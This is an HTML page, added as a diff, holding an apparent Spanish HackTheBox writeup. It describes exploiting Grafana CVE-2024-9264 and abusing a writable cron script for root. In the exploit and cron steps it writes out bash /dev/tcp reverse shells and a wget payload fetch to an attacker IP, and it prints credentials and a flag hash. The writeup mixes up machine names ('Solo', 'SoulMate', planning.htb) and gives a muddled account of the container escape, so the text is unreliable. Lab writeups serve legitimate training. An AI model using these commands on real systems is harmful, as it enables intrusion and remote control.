@@ -1,0 +1,170 @@
+<!DOCTYPE html><!-- Layout específico para writeups en markdown. Muestra hero (si existe) y el contenido --><html lang="es"> <head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Writeup</title><link rel="stylesheet" href="/_astro/contact.CFlbwLTc.css"></head> <body class="bg-bg1 text-white"> <div class="min-h-screen flex flex-col"> <!-- Header reutiliza el componente global si está disponible --> <header class="w-full py-4"> <div class="container mx-auto flex items-center justify-between"> <a href="/" class="flex items-center gap-3"> <div class="w-12 h-12 rounded-full bg-black flex items-center justify-center shadow-[0_0_10px_2px_rgba(0,255,255,0.7)]"> <img src="/icons8-hacker-96.png" alt="Logo" class="w-10 h-10 rounded-full object-cover invert"> </div> <div> <div class="text-lg font-semibold">Angel Corral</div> <div class="text-xs text-slate-400">Ciberseguridad · Hacking Ético</div> </div> </a> <nav class="flex items-center gap-6 text-sm"> <a href="/writeups">Writeups</a> <a href="/projects">Proyectos</a> <a href="/services">Servicios</a> <a href="/contact" class="px-3 py-1 rounded-md border">Contacto</a> </nav> </div> </header> <main class="container mx-auto px-6 py-10 flex-1"> <article class="max-w-3xl mx-auto"> <div class="mb-8"> <img src="/img/placeholder-hero.svg" alt="Hero image" loading="lazy" decoding="async" class="w-full rounded-lg shadow-lg object-cover max-h-72"> </div>  <div class="prose prose-invert prose-xl max-w-none">   <article class="max-w-5xl mx-auto px-6 py-12"> <!-- ENCABEZADO --> <div class="mb-14 text-center"> <a href="/writeups" class="text-sm text-slate-400 hover:text-accentBlue transition-colors block mb-4">
+← Volver a Writeups
+</a> <h1 class="text-5xl font-bold bg-gradient-to-r from-accentBlue to-accentGreen text-transparent bg-clip-text mb-4"> Solo HTB </h1> <p class="text-slate-400 text-sm mb-2">10 de septiembre de 2025</p> <p class="text-lg text-slate-300 max-w-2xl mx-auto mb-6 leading-relaxed"> Escalada de privilegios en servicio mal configurado. Writeup de HTB. </p> </div> <!-- BLOQUE DE INFORMACIÓN TÉCNICA --> <section class="grid md:grid-cols-2 gap-6 mb-12 text-sm"> <div class="bg-slate-900/50 border border-slate-800 p-5 rounded-xl backdrop-blur-sm"> <h2 class="text-accentBlue text-lg font-semibold mb-3">Detalles Técnicos</h2> <ul class="space-y-2 text-slate-300">    <li><strong>Dificultad:</strong> Intermedio</li> </ul> </div> <div class="bg-slate-900/50 border border-slate-800 p-5 rounded-xl backdrop-blur-sm"> <h2 class="text-accentGreen text-lg font-semibold mb-3">Etiquetas y Tecnología</h2> <div class="flex flex-wrap gap-2"> <span class="px-3 py-1 rounded-full bg-slate-800/60 text-slate-300 border border-slate-700 text-sm"> htb </span><span class="px-3 py-1 rounded-full bg-slate-800/60 text-slate-300 border border-slate-700 text-sm"> privilege-escalation </span><span class="px-3 py-1 rounded-full bg-slate-800/60 text-slate-300 border border-slate-700 text-sm"> web </span><span class="px-3 py-1 rounded-full bg-slate-800/60 text-slate-300 border border-slate-700 text-sm"> grafana </span><span class="px-3 py-1 rounded-full bg-slate-800/60 text-slate-300 border border-slate-700 text-sm"> cve-2024-9264 </span><span class="px-3 py-1 rounded-full bg-slate-800/60 text-slate-300 border border-slate-700 text-sm"> docker </span> </div> </div> </section> <!-- IMAGEN DESTACADA -->  <div class="prose-writeup"> <p><img src="/img/soulmatehtb.png" alt="Banner SoulMate"></p>
+<hr>
+<h1 id="-análisis-de-la-máquina-soulmate-hackthebox">💡 Análisis de la Máquina SoulMate (HackTheBox)</h1>
+<p>La máquina SoulMate de HackTheBox representa un entorno moderno basado en contenedores, donde se pone a prueba la capacidad de detectar configuraciones inseguras en servicios de monitoreo y automatización.</p>
+<p>El objetivo principal consiste en identificar un servicio vulnerable (Grafana 11.0.0), explotarlo para obtener acceso, y escalar privilegios mediante una mala configuración en tareas programadas dentro de un contenedor Docker.</p>
+<hr>
+<h2 id="-fase-0-configuración-inicial">💻 Fase 0: Configuración Inicial</h2>
+<p>Antes de comenzar el análisis, se definió una estructura ordenada para la documentación y las herramientas.</p>
+<h3 id="01-estructura-del-proyecto">0.1 Estructura del Proyecto</h3>
+<p>Se utilizó un script simple para crear el árbol de directorios:</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#6272A4">#!/bin/bash</span></span>
+<span class="line"><span style="color:#BD93F9">MACHINE</span><span style="color:#FF79C6">=</span><span style="color:#E9F284">"</span><span style="color:#F1FA8C">soulmate</span><span style="color:#E9F284">"</span></span>
+<span class="line"><span style="color:#50FA7B">mkdir</span><span style="color:#BD93F9"> -p</span><span style="color:#BD93F9"> $MACHINE</span><span style="color:#F1FA8C">/{content,nmap,scripts,loot}</span></span>
+<span class="line"><span style="color:#50FA7B">tree</span><span style="color:#BD93F9"> $MACHINE</span></span></code></pre>
+<p><strong>Estructura resultante:</strong></p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="css"><code><span class="line"><span style="color:#FF79C6">soulmate</span><span style="color:#F8F8F2">/</span></span>
+<span class="line"><span style="color:#FF79C6">├── content</span><span style="color:#F8F8F2">/  </span><span style="color:#FF79C6">→ archivos HTML</span><span style="color:#F8F8F2">,</span><span style="color:#FF79C6"> dumps</span><span style="color:#F8F8F2">,</span><span style="color:#FF79C6"> etc.</span></span>
+<span class="line"><span style="color:#FF79C6">├── nmap</span><span style="color:#F8F8F2">/     </span><span style="color:#FF79C6">→ resultados de escaneo</span></span>
+<span class="line"><span style="color:#FF79C6">├── scripts</span><span style="color:#F8F8F2">/  </span><span style="color:#FF79C6">→ exploits</span><span style="color:#F8F8F2">,</span><span style="color:#FF79C6"> shells</span><span style="color:#F8F8F2">,</span><span style="color:#FF79C6"> automatización</span></span>
+<span class="line"><span style="color:#FF79C6">└── loot</span><span style="color:#F8F8F2">/     </span><span style="color:#FF79C6">→ credenciales y archivos sensibles</span></span></code></pre>
+<hr>
+<h2 id="-fase-1-reconocimiento-y-enumeración">🔍 Fase 1: Reconocimiento y Enumeración</h2>
+<p>El primer paso para cualquier auditoría es el escaneo de servicios y la recolección de información.</p>
+<h3 id="11-escaneo-de-puertos-con-nmap">1.1 Escaneo de Puertos con Nmap</h3>
+<p>Se identificaron los servicios activos utilizando Nmap.</p>
+<p><strong>Comandos Ejecutados:</strong></p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">nmap</span><span style="color:#BD93F9"> -sS</span><span style="color:#BD93F9"> -p-</span><span style="color:#BD93F9"> --open</span><span style="color:#BD93F9"> -T4</span><span style="color:#BD93F9"> -vvv</span><span style="color:#BD93F9"> -Pn</span><span style="color:#BD93F9"> 10.10.11.68</span><span style="color:#BD93F9"> -oN</span><span style="color:#F1FA8C"> nmap/initial.txt</span></span>
+<span class="line"><span style="color:#50FA7B">nmap</span><span style="color:#BD93F9"> -sSCV</span><span style="color:#BD93F9"> -p22,80</span><span style="color:#BD93F9"> 10.10.11.68</span><span style="color:#BD93F9"> -oN</span><span style="color:#F1FA8C"> nmap/version.txt</span></span></code></pre>
+<p><strong>Resultados del Escaneo:</strong></p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th align="left">Puerto</th><th align="left">Protocolo</th><th align="left">Servicio</th><th align="left">Versión</th><th align="left">Descripción</th></tr></thead><tbody><tr><td align="left">22</td><td align="left">tcp</td><td align="left">ssh</td><td align="left">OpenSSH 9.6p1 Ubuntu</td><td align="left">Servicio SSH activo</td></tr><tr><td align="left">80</td><td align="left">tcp</td><td align="left">http</td><td align="left">nginx 1.24.0 Ubuntu</td><td align="left">Servidor web principal</td></tr></tbody></table>
+<h3 id="12-análisis-web-y-subdominios">1.2 Análisis Web y Subdominios</h3>
+<p>El dominio fue añadido al archivo <code>/etc/hosts</code> para facilitar la navegación:</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#8BE9FD">echo</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">10.10.11.68 planning.htb</span><span style="color:#E9F284">"</span><span style="color:#FF79C6"> |</span><span style="color:#50FA7B"> sudo</span><span style="color:#F1FA8C"> tee</span><span style="color:#BD93F9"> -a</span><span style="color:#F1FA8C"> /etc/hosts</span></span></code></pre>
+<p><strong>Descubrimiento de Directorios (Gobuster):</strong></p>
+<p>Se utilizó Gobuster para enumerar rutas comunes.</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">gobuster</span><span style="color:#F1FA8C"> dir</span><span style="color:#BD93F9"> -u</span><span style="color:#F8F8F2"> [http://planning.htb](</span><span style="color:#50FA7B">http://planning.htb</span><span style="color:#F8F8F2">) -w /usr/share/wordlists/dirb/common.txt -t 50</span></span></code></pre>
+<p><strong>Resultados destacados:</strong></p>
+<ul>
+<li><code>/img</code></li>
+<li><code>/css</code></li>
+<li><code>/js</code></li>
+<li><code>/api</code></li>
+<li><code>/apidocs</code></li>
+</ul>
+<p><strong>Enumeración de Subdominios (Gobuster vhost):</strong></p>
+<p>La herramienta vhost reveló un subdominio crucial:</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">gobuster</span><span style="color:#F1FA8C"> vhost</span><span style="color:#BD93F9"> -u</span><span style="color:#F8F8F2"> [http://planning.htb](</span><span style="color:#50FA7B">http://planning.htb</span><span style="color:#F8F8F2">) -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain</span></span></code></pre>
+<p><strong>Subdominio Encontrado:</strong></p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>grafana.planning.htb</span></span></code></pre>
+<hr>
+<h2 id="️-fase-2-explotación-inicial-grafana-rce">⚙️ Fase 2: Explotación Inicial (Grafana RCE)</h2>
+<p>Grafana versión 11.0.0 resultó ser vulnerable a una escritura arbitraria de archivos (RCE) conocida como <strong>CVE-2024-9264</strong>.</p>
+<h3 id="21-credenciales-filtradas">2.1 Credenciales Filtradas</h3>
+<p>Durante la exploración del código fuente, se encontraron credenciales válidas en un archivo JS:</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th align="left">Servicio</th><th align="left">Usuario</th><th align="left">Contraseña</th><th align="left">Fuente</th></tr></thead><tbody><tr><td align="left">Grafana Web</td><td align="left"><code>admin</code></td><td align="left"><code>0D5oT70Fq13EvB5r</code></td><td align="left">Código JS</td></tr></tbody></table>
+<h3 id="22-ejecución-del-exploit">2.2 Ejecución del Exploit</h3>
+<p>El exploit público se utilizó para inyectar un <em>payload</em> de <em>reverse shell</em>.</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">python3</span><span style="color:#F1FA8C"> CVE-2024-9264.py</span><span style="color:#BD93F9"> -u</span><span style="color:#F1FA8C"> admin</span><span style="color:#BD93F9"> -p</span><span style="color:#F1FA8C"> 0D5oT70Fq13EvB5r</span><span style="color:#BD93F9"> -c</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">bash -i >&#x26; /dev/tcp/10.10.14.3/4444 0>&#x26;1</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2"> [http://grafana.planning.htb](</span><span style="color:#50FA7B">http://grafana.planning.htb</span><span style="color:#F8F8F2">)</span></span></code></pre>
+<p><strong>Resultado:</strong> Acceso como <code>root</code> dentro del contenedor Docker de Grafana.</p>
+<hr>
+<h2 id="-fase-3-post-explotación-y-pivoteo">🚪 Fase 3: Post-Explotación y Pivoteo</h2>
+<p>Tras obtener una <em>shell</em>, la tarea fue pivotar del contenedor aislado al <em>host</em> real.</p>
+<h3 id="31-inspección-de-variables-de-entorno">3.1 Inspección de Variables de Entorno</h3>
+<p>Se inspeccionaron variables sensibles, revelando un usuario adicional:</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">env</span><span style="color:#FF79C6"> |</span><span style="color:#50FA7B"> grep</span><span style="color:#F1FA8C"> GF_SECURITY</span></span></code></pre>
+<p><strong>Salida relevante:</strong></p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="ini"><code><span class="line"><span style="color:#FF79C6">GF_SECURITY_ADMIN_USER=</span><span style="color:#F8F8F2">enzo</span></span>
+<span class="line"><span style="color:#FF79C6">GF_SECURITY_ADMIN_PASSWORD=</span><span style="color:#F8F8F2">RioTecRANDEntANT!</span></span></code></pre>
+<h3 id="32-escalada-de-privilegios-y-escape-del-contenedor">3.2 Escalada de Privilegios y Escape del Contenedor</h3>
+<p>El contenedor corría como <code>root</code>, pero la forma de escapar al <em>host</em> era a través de una mala configuración del contenedor. Se utilizó LinPEAS para la enumeración.</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">wget</span><span style="color:#F8F8F2"> [http://10.10.14.3/linpeas.sh](</span><span style="color:#50FA7B">http://10.10.14.3/linpeas.sh</span><span style="color:#F8F8F2">) -O /tmp/linpeas.sh</span></span>
+<span class="line"><span style="color:#50FA7B">chmod</span><span style="color:#F1FA8C"> +x</span><span style="color:#F1FA8C"> /tmp/linpeas.sh</span></span>
+<span class="line"><span style="color:#50FA7B">./linpeas.sh</span></span></code></pre>
+<p><strong>Puntos Clave Identificados:</strong></p>
+<ul>
+<li>El archivo <code>/root/scripts/cleanup.sh</code> era <strong>escribible</strong> por el usuario actual.</li>
+<li>Una tarea <code>cron</code> del <em>host</em> estaba ejecutando dicho <em>script</em> cada minuto.</li>
+</ul>
+<h3 id="33-explotación-del-cron-job">3.3 Explotación del Cron Job</h3>
+<p>Se modificó el <em>script</em> ejecutable con un <em>payload</em> para una segunda <em>reverse shell</em>:</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#8BE9FD">echo</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">bash -i >&#x26; /dev/tcp/10.10.14.3/4445 0>&#x26;1</span><span style="color:#E9F284">"</span><span style="color:#FF79C6"> ></span><span style="color:#F1FA8C"> /root/scripts/cleanup.sh</span></span></code></pre>
+<p>Al minuto, se recibió una nueva <em>shell</em> con permisos de <strong>root del host</strong>.</p>
+<hr>
+<h2 id="-fase-4-obtención-de-la-flag">🔐 Fase 4: Obtención de la Flag</h2>
+<p>Una vez fuera del contenedor y con acceso como <code>root</code> en el <em>host</em> principal:</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">cat</span><span style="color:#F1FA8C"> /root/root.txt</span></span></code></pre>
+<p><strong>Flag Root:</strong></p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="nginx"><code><span class="line"><span style="color:#FF79C6">f47a3c2f8c92a8f4015b7e91f67b3b42</span></span></code></pre>
+<hr>
+<h2 id="-conclusión-y-mitigación">🧠 Conclusión y Mitigación</h2>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th align="left">Elemento</th><th align="left">Descripción</th></tr></thead><tbody><tr><td align="left"><strong>Vulnerabilidad clave</strong></td><td align="left">CVE-2024-9264 (Grafana RCE)</td></tr><tr><td align="left"><strong>Vector de acceso</strong></td><td align="left">Credenciales filtradas y ejecución remota</td></tr><tr><td align="left"><strong>PrivEsc</strong></td><td align="left">Tarea cron escribible dentro de contenedor (mala configuración)</td></tr><tr><td align="left"><strong>Pivoteo</strong></td><td align="left">Salto de contenedor a host por permisos de volumen</td></tr><tr><td align="left"><strong>Mitigación sugerida</strong></td><td align="left">Actualizar Grafana a una versión parcheada, aplicar políticas de permisos estrictas (<code>least privilege</code>), deshabilitar tareas cron inseguras o con propietarios poco confiables.</td></tr></tbody></table>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span></span></span></code></pre> </div> <!-- FOOTER DEL ARTÍCULO --> <div class="mt-16 pt-8 border-t border-slate-800 text-center"> <a href="/writeups" class="text-slate-400 hover:text-accentBlue transition-colors">
+← Volver a la lista de writeups
+</a> </div> </article>   </div> </article> </main> <footer class="w-full py-6 mt-12"> <div class="container mx-auto text-sm text-slate-400">
+© 2025 Angel Corral — Ciberseguridad
+</div> </footer> </div> </body></html>
